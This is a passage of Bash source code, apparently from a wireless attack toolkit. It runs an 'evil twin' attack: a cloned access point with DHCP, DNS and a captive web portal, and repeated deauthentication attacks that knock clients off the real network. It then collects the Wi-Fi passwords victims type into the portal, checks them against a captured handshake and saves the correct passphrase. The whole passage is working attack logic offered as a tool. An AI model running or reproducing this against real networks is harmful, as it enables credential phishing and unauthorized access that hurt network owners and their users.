	if ! Twin_dnsCustom --bm "$processMetaPyDns_1" -x "$windowParametersTwinPyDns" -i "$ipGateway";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to start DNS server';

		return 1;
	fi

	declare dnsStartCount="$(( dnsStartCount + 1 ))";

	# Start a HTTP server

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nT -- $'Starting HTTP server';

	if ! Twin_httpServer --bm "$processMetaWeb_1" -x "$windowParametersTwinWebServer";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to start HTTP server';

		return 1;
	fi

	declare httpStartCount="$(( httpStartCount + 1 ))";

	# While not received a PSK for the handshake
	while [[ "${pskCorrect+s}" == '' ]];
	do
		declare currentTimeSeconds="$( Misc_DateTime -t 3 )";
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nTf $'Cycle #%s' -- "$mainCycleCount";
		declare mainCycleCount="$(( mainCycleCount + 1 ))";

		# If no actual target AP BSSID is available after cycle (e.g. a companion did not find)
		if [[ ! "$apBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]];
		then
			declare apBssid="$apTargetBssid";
			declare apChannel='';
			declare apTargetDataStatus=1; # Set the target AP data status to "set to initial"

			[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nmTf $'Trying initial target AP BSSID %s' -- \
				"$( Twin_previewAPDetails "$apBssid" "$apChannel" )";
		fi

		#############
		# PSK check #
		#############

		# If twin AP is up, PSK verification timed out, and any web client input file exists (~session)
		if
			Environment_ProcessBindSearch --bm "$processMetaWeb_1" && (( pskVerifyTime + pskVerifyRestartTimeout < currentTimeSeconds )) &&
			Base_FsExists -t 1 -- "${Twin_pskTryDirpath}/${Twin_pskTryFilenamePrefix}"* # i.e. .../web/psk_tries/psk_try...
		then
			declare pskTryFilepath;

			# Each web client input file
			for pskTryFilepath in "${Twin_pskTryDirpath}/${Twin_pskTryFilenamePrefix}"*; # i.e. .../web/psk_tries/psk_try_{ip}_{rand}_{timestamp}
			do
				declare pskTryIp="${pskTryFilepath%_*}"; # psk_try_{ip}_{rand}
				declare pskTryIp="${pskTryIp%_*}"; # psk_try_{ip}
				declare pskTryIp="${pskTryIp##*_}"; # ip

				[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' \
					-nmTf $'{{@clLightOrange}}PSK received{{@clDefault}} from \'{{@clLightBlue}}%s{{@clDefault}}\' (%s total)' -- \
						"${pskTryIp//-/.}" "$(( pskVerifyCount + 1 ))";

				declare pskTry;

				# Loop through each unchecked PSK form the web input file
				while IFS= read -r pskTry;
				do
					# Try to log the PSK
					if Base_FsWrite -anf "$Twin_pskLogFilepath" -- "[ $( Misc_DateTime -t 1 ) ] $( printf '%15s' "${pskTryIp//-/.}"; ): ${pskTry}";
					then
						[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nTf $'Stored PSK in log.';
					else
						[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nTf $'Failed to store PSK in log';
					fi

					# If the PSK is correct
					if Twin_PskVerify -vf "$__handshakeFilepath" -a "$apBssid" -- "$pskTry";
					then
						declare pskCorrect="$pskTry";

						break;
					fi

					Misc_SoundPlay 'psk_incorrect';
				done < "$pskTryFilepath";

				# The path to store the result of a all PSK check for current web "session" (i.e. .../web/checked_psk_try_{ip}_{rand}_{timestamp})
				declare pskCheckedFilepath="${Twin_pskTryDirpath}/${Twin_pskCheckedFilenamePrefix}_$( basename -- "$pskTryFilepath" 2> '/dev/null'; )";

				# Try to write to the web result file
				if ! Base_FsWrite -f "$pskCheckedFilepath" -- "$( [ "${pskCorrect+s}" != '' ] && printf 1 || printf 0 )";
				then
					[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nTf $'Failed to notify web client of PSK verification result: \'%s\'' \
						"$( basename -- "$pskCheckedFilepath" 2> '/dev/null'; )";
				fi

				# Try to remove the "unchecked" PSKs file (is also used by web backend while loop,
				# so to stop the loop if no check result appeared from the above)
				if ! Base_FsDelete -e -- "$pskTryFilepath";
				then
					[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to remove file of processed PSK: \'%s\'' \
						"$( basename -- "$pskTryFilepath" 2> '/dev/null'; )";
				fi

				# If got a correct PSK
				if [[ "${pskCorrect+s}" != '' ]];
				then
					if Base_FsExists -t 1 -- "$pskCheckedFilepath";
					then
						declare webClientWaitSecondsOnGotPsk=10;

						[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'Waiting for web client to process correct PSK verification result (%s)' \
							"${webClientWaitSecondsOnGotPsk}s";

						declare timeToWait=$(( webClientWaitSecondsOnGotPsk + $( Misc_DateTime -t 3 ) ));

						# Wait for the web version to notify about the check result, before stopping
						while Base_FsExists -t 1 -- "$pskCheckedFilepath" && (( timeToWait > "$( Misc_DateTime -t 3 )" ));
						do
							sleep 1;
						done

						if Base_FsExists -t 1 -- "$pskCheckedFilepath";
						then
							[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nTf $'Web client failed to process correct PSK verification result within %s' \
								"${webClientWaitSecondsOnGotPsk}s";
						else
							[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nTf $'Web client processed result';
						fi
					fi

					# Stop the file loop
					break;
				fi
			done

			# If got a correct PSK
			if [[ "${pskCorrect+s}" != '' ]];
			then
				# If any web client haven't read its check result, yet
				if Base_FsExists -t 1 -- "${Twin_pskTryDirpath}/${Twin_pskTryFilenamePrefix}"*; # i.e. .../web/psk_tries/psk_try...
				then
					declare webClientWaitSecondsOnGotPsk=10;

					[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'Waiting for all web clients to process PSK verification results (%s)...' \
						"${webClientWaitSecondsOnGotPsk}s";

					declare timeToWait=$(( webClientWaitSecondsOnGotPsk + $( Misc_DateTime -t 3 ) ));

					# Wait for web clients to read their check results
					while Base_FsExists -t 1 -- "${Twin_pskTryDirpath}/${Twin_pskTryFilenamePrefix}"* && (( timeToWait > "$( Misc_DateTime -t 3 )" ));
					do
						sleep 1;
					done

					if Base_FsExists -t 1 -- "${Twin_pskTryDirpath}/${Twin_pskTryFilenamePrefix}"*;
					then
						[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nTf $'Not all web clients processed verification results within %s...' \
							"${webClientWaitSecondsOnGotPsk}s";
					else
						[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nTf $'All web clients processed results';
					fi
				fi

				# Stop the main loop
				break;
			fi

			declare pskVerifyCount="$(( pskVerifyCount + 1 ))";
			declare pskVerifyTime="$( Misc_DateTime -t 3 )";
		fi

		#############
		# Companion #
		#############

		# If the companion capture reached the timeout
		if (( companionStartTime + companionRestartTimeout < currentTimeSeconds ));
		then
			# Terminate current companion capture if exists
			Environment_ProcessBindTerminate --bm "$processMetaCompanion_1";
			declare apTargetOnlineTime=-1;

			# If the start time of the companion capture is already declared (e.g. was started previously)
			# if [[ "$companionStartTime" != 0 ]];
			# then
			# 	declare companionStartCount="$(( companionStartCount + 1 ))";
			# fi

			# declare companionStartTime="$( Misc_DateTime -t 3 )";
		fi

		# If the companion is not running
		if ! Environment_ProcessBindSearch --bm "$processMetaCompanion_1";
		then
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting companion capture%s %s' -- \
				"$( (( companionStartCount > 0 )) && printf 'Res' || printf 'S' )" "$( (( companionStartCount > 0 )) && printf ' (%s total)' "$companionStartCount" )" \
				"$( Twin_previewAPDetails "$apBssid" "$apChannel" )";

			# If the companion capture filepath is declared (e.g. was started previously)
			if [[ "$Twin_Start_companionCaptureBaseFilepath" != '' ]];
			then
				# Delete all files of the previous companion capture if exists
				Base_FsDelete -t 1 -- "$Twin_Start_companionCaptureBaseFilepath"*;
			fi

			declare Twin_Start_companionCaptureBaseFilepath;

			# Start a companion capture
			if
				! Capture_Start -o Twin_Start_companionCaptureBaseFilepath --bm "$processMetaCompanion_1" -x "$windowParametersTwinCompanion" \
					-d "$deviceSecondary" -a "$apBssid" -c "$apChannel";
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart companion capture for target AP %s' -- \
					"$( (( companionStartCount > 0 )) && printf 're' )" "$( Twin_previewAPDetails "$apBssid" "$apChannel" )";

				return 1;
			fi

			declare companionStartTime="$( Misc_DateTime -t 3 )";
			declare companionStartCount="$(( companionStartCount + 1 ))";
		fi

		##########################
		# Companion capture data #
		##########################

		# If the companion has been working for at least N seconds and
		# if found an AP with the same SSID in the companion capture file
		if (( companionStartTime + companionFirstCheckTimeout < currentTimeSeconds ));
		then
			# Reset the companion's AP data
			declare apCompanionBssid='';
			declare apCompanionChannel='';
			declare apCompanionSsid='';
			declare companionApFoundCount=0;
			declare apCompanionApProtectedFoundCount=0;
			declare Twin_Start_apData;

			if Capture_CsvApRead -o Twin_Start_apData -f "${Twin_Start_companionCaptureBaseFilepath}.csv";
			then
				declare apDataIndex;

				# Loop through each AP from the capture file
				for (( apDataIndex = 0; apDataIndex < ${#Twin_Start_apData[@]}; apDataIndex++ ));
				do
					declare apCsvBssid="${Twin_Start_apData[$apDataIndex]}";
					declare apCsvChannel="${Twin_Start_apDataChannels[$apDataIndex]}";
					declare apCsvSsid="${Twin_Start_apDataSsids[$apDataIndex]}";
					declare apCsvPrivacy="${Twin_Start_apDataPrivacies[$apDataIndex]}";
					declare apCsvStationCount="${Twin_Start_apDataStationCounts[$apDataIndex]}";

					# If found a protected station (WPA, WPA2, WPA3...)
					if [[ "$apCsvPrivacy" == *"WPA"* ]];
					then
						# Update the target/relative AP's data
						declare apCompanionBssid="$apCsvBssid";
						declare apCompanionChannel="$apCsvChannel";
						declare apCompanionSsid="$apCsvSsid";
						declare apCompanionApProtectedFoundCount=$(( apCompanionApProtectedFoundCount + 1 ));
					fi
				done

				declare companionApFoundCount="${#Twin_Start_apData[@]}";
			else
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nmTf $'Could not read companion capture file';
			fi

			# If found any related protected AP
			if [[ "$apCompanionApProtectedFoundCount" != 0 ]];
			then
				# Refresh the target AP's presence time
				apTargetOnlineTime="$( Misc_DateTime -t 3 )";

				[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nmTf $'Updated target AP online time: %s (%s)' -- \
					"$apTargetOnlineTime" "$( date '+%F_%T' -d "@${apTargetOnlineTime}" )";
			elif [[ "$apTargetOnlineTime" == -1 ]]; # If it's the first companion capture check after a companion restart
			then
				declare apTargetOnlineTime=-2;
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nmTf $'Companion: target AP {{@clRed}}not found{{@clDefault}} (%s total)' -- "$companionApFoundCount";
			fi
		else
			declare apCompanionBssid="$apBssid";
			declare apCompanionChannel="$apChannel";
			declare apCompanionSsid="$apSsid";
		fi

		##############################
		# Access Point's data change #
		##############################

		# If the companion capture data was processed after its start and the companion's AP data mismatches with the target's
		if
			[[
				"$apTargetOnlineTime" != -1 && (
					"$apCompanionChannel" != "$apChannel" || "$apCompanionBssid" != "$apBssid" || ( "$apCompanionSsid" != '' && "$apCompanionSsid" != "$apSsid" )
				)
			]]
		then
			if [[ "$apCompanionChannel" != '' && "$apCompanionBssid" != '' ]];
			then
				declare apTargetDataStatus=2; # Set the target AP data status to "At least one target AP parameter has changed"

				if [[ "$verbose" != 0 ]];
				then
					declare updatedApData=();
					[[ "$apCompanionBssid" != "$apBssid" ]] && updatedApData+=( "$( printf $'B \'%s\' -> \'%s\'' "$apBssid" "$apCompanionBssid" )" );
					[[ "$apCompanionChannel" != "$apChannel" ]] && updatedApData+=( "$( printf $'C \'%s\' -> \'%s\'' "$apChannel" "$apCompanionChannel" )" );

					[[ "$apCompanionSsid" != '' && "$apCompanionSsid" != "$apSsid" ]] && 
						updatedApData+=( "$( printf $'S \'%s\' -> \'%s\'' "$apSsid" "$apCompanionSsid" )" );

					Misc_PrintF -v 3 -t 'w' -nmTf $'Target AP details {{@clYellow}}updated{{@clDefault}}: %s' -- \
						"$( Misc_ArrayJoin '' '' ', ' "${updatedApData[@]}" )";
				fi
			else
				declare apTargetDataStatus=3; # Set the target AP data status to "Not found/incomplete target AP data"
				declare missingApData=();
				[[ "$apCompanionChannel" == '' ]] && missingApData+=( 'CHA' );
				[[ "$apCompanionBssid" == '' ]] && missingApData+=( 'BSSID' );

				[[ "$__verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nTf $'Companion: Incomplete target AP details. Missing: %s' -- \
					"$( Misc_ArrayJoin -- "${missingApData[@]}" )";
			fi

			# Terminate the current twin AP, DHCP server, deauth attack and companion processes if exist in order to restart them with new data
			Environment_ProcessBindTerminate --bm "$processMetaHotspot_1";
			Environment_ProcessBindTerminate --bm "$processMetaDhcp_1";
			Environment_ProcessBindTerminate --bm "$processMetaAttackDeauth_1";
			Environment_ProcessBindTerminate --bm "$processMetaCompanion_1";

			# Update the target AP's details according to the companion

			declare apChannel="$apCompanionChannel";
			declare apBssid="$apCompanionBssid";

			if [[ "$apCompanionSsid" != '' ]];
			then
				declare apSsid="$apCompanionSsid";
			fi

			# Set the target AP's data status to "target AP's data has updated"
			# declare apTargetDataStatus=2;

			# Sleep each full cycle
			# sleep "$twinCycleWaitSeconds";

			# Restart the full cycle
			# continue;
		fi

		################################
		# Target Access Point's status #
		################################

		# If the companion data has not been checked after its (re)start, yet
		if [[ "$apTargetOnlineTime" == -1 ]];
		then
			# Sleep each full cycle
			sleep "$twinCycleWaitSeconds";

			continue;
		fi

		# If companion didn't find the target or not found/incomplete target AP data
		if [[ "$apTargetOnlineTime" == -2 || "$apTargetDataStatus" == 3 ]];
		then
			# If the target AP's off-line timeout reached and it is considered currently active
			if (( apTargetOnlineTime + apTargetOnlineTimeout < currentTimeSeconds )) && [[ "$apTargetIsActive" == 1 ]];
			then
				if [[ "$apStartCount" != 0 ]];
				then
					[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nmTf $'Target AP is probably {{@clRed}}offline{{@clDefault}}';
					Misc_SoundPlay 'ap_lost';
				fi

				declare apTargetIsActive=0;
			fi

			# declare apTargetDataStatus=0;

			# Sleep each full cycle
			sleep "$twinCycleWaitSeconds";

			continue;
		fi

		if [[ "$apTargetIsActive" == 0 ]];
		then
			if [[ "$apStartCount" != 0 ]];
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 's' -nmTf $'{{@clLightGreen}}Found{{@clDefault}} target AP';
				Misc_SoundPlay 'ap_found';
			fi

			declare apTargetIsActive=1;
		fi

		########
		# Twin #
		########

		# If there is no active DNS server
		if ! Environment_ProcessBindSearch --bm "$processMetaPyDns_1";
		then
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting DNS server%s' -- \
				"$( (( dnsStartCount > 0 )) && printf 'Res' || printf 'S' )" "$( (( dnsStartCount > 0 )) && printf ' (%s total)' "$dnsStartCount" )";

			# Start a DNS server
			if ! Twin_dnsCustom --bm "$processMetaPyDns_1" -x "$windowParametersTwinPyDns" -i "$ipGateway";
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart DNS server' -- "$( (( dnsStartCount > 0 )) && printf 're' )";

				return 1;
			fi

			declare dnsStartCount="$(( dnsStartCount + 1 ))";
		fi

		# If there is no active HTTP server
		if ! Environment_ProcessBindSearch --bm "$processMetaWeb_1";
		then
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting HTTP server%s' -- \
				"$( (( httpStartCount > 0 )) && printf 'Res' || printf 'S' )" "$( (( httpStartCount > 0 )) && printf ' (%s total)' "$httpStartCount" )";

			# Start a HTTP server
			if ! Twin_httpServer --bm "$processMetaWeb_1" -x "$windowParametersTwinWebServer";
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart HTTP server' -- "$( (( httpStartCount > 0 )) && printf 're' )";

				return 1;
			fi

			declare httpStartCount="$(( httpStartCount + 1 ))";
		fi

		# If target BSSID and SSID are available
		if [[ "$apBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] && (( ${#apSsid} > 0 && ${#apSsid} <= 32 ));
		then
			# If there is no active twin AP
			if ! Environment_ProcessBindSearch --bm "$processMetaHotspot_1";
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting twin AP%s %s' -- \
					"$( (( apStartCount > 0 )) && printf 'Res' || printf 'S' )" "$( (( apStartCount > 0 )) && printf ' (%s total)' "$apStartCount" )" \
					"$( Twin_previewAPDetails "$apBssid" "$apChannel" "$apSsid" )";

				# Slightly randomize twin AP's data in order to not interfere with its traffic (e.g. deauthentication attacks)
				declare apTwinBssid="$( Twin_BssidRand "$apBssid" )";
				declare apTwinSsid="$apSsid";

				if [[ "$apChannel" =~ ^([1-9]|1[0-3])$ ]]; # 1-13
				then
					declare apTwinChannel="$apChannel";
				else
					declare apTwinChannel="$( Misc_RandomInteger -l 1 -h 13 )";
					Misc_PrintF -v d -t '5' -nTf $'No target AP channel is available for twin AP (selected random: %s)' -- "$apTwinChannel";
				fi

				[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'i' -nTmf $'Twin AP: B %s{{@clLightPink}}%s{{@clDefault}}%s, C %s, S \'%s\'' -- \
					"${apTwinBssid:0:13}" "${apTwinBssid:13:1}" "${apTwinBssid:14}" "$apTwinChannel" "$apTwinSsid";

				# Start a twin AP
				if ! Twin_hotspot --bm "$processMetaHotspot_1" -x "$windowParametersTwinHotspot" -d "$deviceMain" -a "$apTwinBssid" -s "$apTwinSsid" -c "$apTwinChannel";
				then
					[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart twin AP' -- "$( (( apStartCount > 0 )) && printf 're' )";

					return 1;
				fi

				declare apStartCount="$(( apStartCount + 1 ))";
			fi

			# If there is no active DHCP server
			if ! Environment_ProcessBindSearch --bm "$processMetaDhcp_1";
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting DHCP server%s' -- \
					"$( (( dhcpStartCount > 0 )) && printf 'Res' || printf 'S' )" "$( (( dhcpStartCount > 0 )) && printf ' (%s total)' "$dhcpStartCount" )";

				# Start a DHCP server
				if ! Twin_dhcp --bm "$processMetaDhcp_1" -x "$windowParametersTwinDhcp" -d "$deviceMain" -i "$ipGateway";
				then
					[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart DHCP server' -- "$( (( dhcpStartCount > 0 )) && printf 're' )";

					return 1;
				fi

				declare dhcpStartCount="$(( dhcpStartCount + 1 ))";
			fi
		else
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nTf $'Could not start twin AP (no target BSSID and SSID known)';
		fi

		###########################
		# Deauthentication attack #
		###########################

		# If no attack type(s) is declared, no target AP BSSID, no active twin AP, or no active companion capture
		if
			[[ "${#attackDeauthTypes[@]}" == 0 || ! "$apBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] ||
			! Environment_ProcessBindSearch --bm "$processMetaHotspot_1" || ! Environment_ProcessBindSearch --bm "$processMetaCompanion_1";
		then
			# declare apTargetDataStatus=0;
			sleep "$twinCycleWaitSeconds";

			continue;
		fi

		# If more than 1 attack type is declared and reached the attack timeout
		if (( ${#attackDeauthTypes[@]} > 1 )) && (( attackDeauthStartTime + deauthRestartTimeout < currentTimeSeconds ));
		then
			# Terminate current deauthentication attack if exists
			Environment_ProcessBindTerminate --bm "$processMetaAttackDeauth_1";

			# If the start time of the attack is already declared (e.g. was started previously)
			# if [[ "$attackDeauthStartTime" != 0 ]];
			# then
			# 	declare attackDeauthStartCount="$(( attackDeauthStartCount + 1 ))";
			# fi

			# declare attackDeauthStartTime="$( Misc_DateTime -t 3 )";
		fi

		# Shift the deauth attack type (loop using modulo)
		declare attackDeauthType="${attackDeauthTypes[$(( attackDeauthStartCount % ${#attackDeauthTypes[@]} ))]}";

		# If the attack type is not an integer or the attack is already running
		if [[ ! "$attackDeauthType" =~ ^(0|[1-9][0-9]*)$ ]] || Environment_ProcessBindSearch --bm "$processMetaAttackDeauth_1";
		then
			declare apTargetDataStatus=0; # Set the target AP data status to "default"
			sleep "$twinCycleWaitSeconds";

			continue;
		fi

		[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting DA (type %s%s) %s' -- \
			"$( (( attackDeauthStartCount > 0 )) && printf 'Res' || printf 'S' )" "$attackDeauthType" \
			"$( (( attackDeauthStartCount > 0 )) && printf '; %s total' "$attackDeauthStartCount" )" \
			"$( Twin_previewAPDetails "$apBssid" "$apChannel" )";

		# Try to (re)start the target AP station deauthentication
		if
			Attacks_IEEE80211Deauth --bm "$processMetaAttackDeauth_1" -x "$windowParametersTwinAttackDeauth" \
				-t "$attackDeauthType" -d "$deviceSecondary" -a "$apBssid" -c "$apChannel";
		then
			declare attackDeauthStartTime="$( Misc_DateTime -t 3 )";
			declare attackDeauthStartCount="$(( attackDeauthStartCount + 1 ))";
		else
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart deauthentication attack' -- "$( (( attackDeauthStartCount > 0 )) && printf 're' )";
		fi

		# Set the target AP data status to "default"
		declare apTargetDataStatus=0;

		# Sleep each full cycle
		sleep "$twinCycleWaitSeconds";
	done

	##########
	# Ending #
	##########

	# Terminate all related processes
	Environment_ProcessBindTerminate --bm "$processMetaPrefixTwin";

	if [[ "${pskCorrect+s}" == '' ]];
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmTf $'Failed to obtain PSK %s' -- "$( Twin_previewAPDetails "$apBssid" "$apChannel" "$apSsid" )";

		return 1;
	fi

	declare twinTimeEnd="$( Misc_DateTime )";
	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 's' -nmTf $'{{@clLightGreen}}Obtained PSK{{@clDefault}}: \'%s\'' -- "$pskCorrect";
	Misc_SoundPlay 'psk_correct';

	# Store the PSK

	declare Twin_pskFilepath="${Twin_psksDirpath}/${Twin_pskFilenamePrefix}_$( Misc_EscapeFilename "$apBssid"; )_$( Misc_DateTime -t 3 ).txt";
	declare separator='';

	if Base_FsExists -t f -- "$Twin_psksDirpath";
	then
		declare separator=$'\n-----\n';
	fi
	
	declare twinTimeEnd="$( Misc_DateTime )";
	declare psk="$( Handshake_Psk "$apSsid" "$pskCorrect" )";

	if
		! Base_FsWrite -anf "$Twin_pskFilepath" -- \
"${separator}Passphrase: '${pskCorrect}'
SSID: '${apSsid}'
BSSID: ${apBssid}
-----
PSK: ${psk}
Handshake: '${__handshakeFilepath}'
Session: '${Environment_SessionId}' ($( Misc_DateTimeDiff -s "$twinTimeStart" -e "$twinTimeEnd"; ); $( Misc_DateTimeDiff -s "$_Main_TimeStart" -e "$twinTimeEnd"; ))
Date: $( Misc_DateTime -t 4 -T "$_Main_TimeStart"; ) - $( Misc_DateTime -t 4; ) (UTC)
-----
Counters: ${apStartCount} ${dhcpStartCount} ${httpStartCount} ${dnsStartCount} ${attackDeauthStartCount} ${companionStartCount} ${mainCycleCount}
PSK tries ($(( pskVerifyCount + 1 )) total):
$( cat -- "$Twin_pskLogFilepath"; )";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmTf $'Failed to store PSK as \'%s\'' -- "$Twin_pskFilepath";
		
		return 2;
	fi

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 's' -nmTf $'Stored PSK: \'%s\'' -- \
		"$( basename -- "$Twin_pskFilepath" 2> "$_Main_Dump"; )";

	if [[ "$outputVariableReferenceName" != '' ]];
	then
		Twin_Start_outputVariableReference="$pskCorrect";
		Twin_Start_outputVariableReferenceBssid="$apBssid";
		Twin_Start_outputVariableReferenceSsid="$apSsid";
		Twin_Start_outputVariableReferenceHandshakeFilepath="$__handshakeFilepath";
		Twin_Start_outputVariableReferencePsk="$psk";
		Twin_Start_outputVariableReferenceFilepath="$Twin_pskFilepath";
	fi

	sleep 1;

	return 0;
}